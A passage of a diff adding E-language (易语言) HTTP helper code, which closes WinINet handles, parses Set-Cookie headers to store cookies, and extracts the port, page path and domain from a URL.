+HTTP查询信息 (HTTP请求句柄, 22, 文本容器, 1024, 0)
+
+ ' 关闭句柄
+Internet关闭句柄 (HTTP请求句柄)
+Internet关闭句柄 (Internet连接句柄)
+Internet关闭句柄 (Internet句柄)
+
+ ' 设置COOKIE
+.如果真 (大于 (寻找文本 (文本容器, “Set-Cookie: ”, 1, 真), 0))
+    赋值 (整数容器1, 打开内存文件 ())
+    写出文本 (整数容器1, 文本容器)
+    移到文件首 (整数容器1)
+    .判断循环首 (等于 (是否在文件尾 (整数容器1, 假), 假))
+        赋值 (文本容器, 读入一行 (整数容器1))
+        .如果真 (大于 (寻找文本 (文本容器, “Set-Cookie: ”, 1, 真), 0))
+            赋值 (文本容器, 文本替换 (文本容器, 1, 12, ))
+            赋值 (整数容器2, 寻找文本 (文本容器, “=”, 1, 真))
+            设置COOKIE (相加 (“http://”, 域名), 取文本左边 (文本容器, 相减 (整数容器2, 1)), 取文本右边 (文本容器, 相减 (取文本长度 (文本容器), 整数容器2)))
+        .如果真结束
+        
+    .判断循环尾 ()
+    关闭文件 (整数容器1)
+.如果真结束
+赋值 (线程号, 0)
+
+.子程序 取端口, 整数型, , 
+.参数 网址, 文本型, , 
+
+.局部变量 符号位置, 整数型, , , 
+.局部变量 域名, 文本型, , , 
+
+.如果 (不等于 (文本比较 (取文本左边 (网址, 7), “http://”, 假), 0))
+    赋值 (符号位置, 寻找文本 (网址, “/”, , 真))
+    .如果 (大于 (符号位置, 0))
+        赋值 (域名, 取文本左边 (网址, 相减 (符号位置, 1)))
+    .否则
+        赋值 (域名, 网址)
+    .如果结束
+    
+.否则
+    赋值 (符号位置, 寻找文本 (网址, “/”, 8, 真))
+    .如果 (大于 (符号位置, 0))
+        赋值 (域名, 取文本中间 (网址, 8, 相减 (符号位置, 8)))
+    .否则
+        赋值 (域名, 文本替换 (网址, 1, 7, ))
+    .如果结束
+    
+.如果结束
+赋值 (符号位置, 寻找文本 (域名, “:”, 1, 真))
+.如果 (大于 (符号位置, 0))
+    赋值 (域名, 取文本右边 (域名, 相减 (取文本长度 (域名), 符号位置)))
+.否则
+    赋值 (域名, “80”)
+.如果结束
+返回 (到数值 (域名))
+
+
+.子程序 取页面地址, 文本型, , 
+.参数 网址, 文本型, , 
+
+.局部变量 页面地址, 文本型, , , 
+.局部变量 符号位置, 整数型, , , 
+.局部变量 域名, 文本型, , , 
+
+赋值 (域名, 取域名 (网址))
+赋值 (符号位置, 寻找文本 (网址, “/”, 寻找文本 (网址, 域名, 1, 真), 真))
+.如果 (大于 (符号位置, 0))
+    赋值 (页面地址, 取文本右边 (网址, 相加 (相减 (取文本长度 (网址), 符号位置), 1)))
+.否则
+    赋值 (页面地址, “/”)
+.如果结束
+返回 (页面地址)
+
+.子程序 取域名, 文本型, , 
+.参数 网址, 文本型, , 
+
+.局部变量 符号位置, 整数型, , , 
+.局部变量 域名, 文本型, , , 
+
+.如果 (不等于 (文本比较 (取文本左边 (网址, 7), “http://”, 假), 0))
+    赋值 (符号位置, 寻找文本 (网址, “/”, , 真))
+    .如果 (大于 (符号位置, 0))
+        赋值 (域名, 取文本左边 (网址, 相减 (符号位置, 1)))
+    .否则
+        赋值 (域名, 网址)
+    .如果结束
+    
+.否则
+    赋值 (符号位置, 寻找文本 (网址, “/”, 8, 真))
+    .如果 (大于 (符号位置, 0))
+        赋值 (域名, 取文本中间 (网址, 8, 相减 (符号位置, 8)))
+    .否则
+        赋值 (域名, 文本替换 (网址, 1, 7, ))
+    .如果结束
+    
+.如果结束
+赋值 (符号位置, 寻找文本 (域名, “:”, 1, 真))
+.如果真 (大于 (符号位置, 0))
+    赋值 (域名, 取文本左边 (域名, 相减 (符号位置, 1)))
+.如果真结束
+返回 (到小写 (域名))
+
+
+ ' 不属于任何一个程序集、类模块的函数：
